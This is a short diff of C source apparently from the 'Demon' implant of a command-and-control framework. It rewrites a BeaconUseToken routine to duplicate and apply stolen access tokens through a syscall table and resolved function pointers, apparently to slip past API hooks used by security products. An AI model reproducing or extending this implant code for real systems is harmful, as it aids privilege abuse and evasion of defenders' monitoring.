@@ -1,7 +1,6 @@
 #include <stdio.h>
 #include <stdint.h>
 #include <stdarg.h>
-#include <windows.h>
 
 #include <Demon.h>
 
@@ -304,10 +303,11 @@ BOOL BeaconUseToken( HANDLE token )
 {
     HANDLE hImpersonateToken = INVALID_HANDLE_VALUE;
 
-    if (!DuplicateTokenEx(token, 0, NULL, SecurityImpersonation, TokenPrimary, &hImpersonateToken)) {
+    if (!Instance->Syscall.NtDuplicateToken(token, 0, NULL, FALSE, TokenPrimary, &hImpersonateToken)) {
         return FALSE;
     }
-    if (!SetThreadToken(NULL, hImpersonateToken)) {
+    
+    if (!Instance->Win32.SetThreadToken(NULL, hImpersonateToken)) {
         return FALSE;
     }
 
